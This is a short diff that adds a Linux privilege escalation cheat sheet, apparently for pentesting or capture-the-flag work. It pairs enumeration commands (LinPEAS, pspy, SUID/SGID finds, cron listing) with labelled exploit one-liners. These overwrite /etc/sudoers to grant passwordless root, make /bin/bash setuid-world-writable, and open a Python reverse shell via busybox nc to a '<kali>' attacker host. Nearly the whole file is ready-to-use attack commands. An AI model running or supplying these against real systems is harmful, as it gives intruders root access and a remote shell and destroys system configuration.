@@ -1,0 +1,9 @@
+LinPEAS Execution:./linpeas.sh | tee <filename1>
+SUID Files:find / -perm -4000 -type f 2>/dev/null
+SGID Files:find / -perm -2000 -type f 2>/dev/null
+Cron List:ls -lah /etc/cron*
+Process Monitoring:timeout 61 ./pspy64
+SUDO Exploit:echo "echo '<user> ALL=(root) NOPASSWD: ALL' > /etc/sudoers" > <filename1>
+SUID Shell Exploit:echo "chmod 4777 /bin/bash" > <filename1>
+Python SUDO Exploit:echo "import os; os.system('echo \\'<user> ALL=(root) NOPASSWD: ALL\\' > /etc/sudoers')" > <filename1>
+Python Reverse Shell:echo "import os; os.system('busybox nc <kali> <kaliPort> -e bash')" > <filename1>
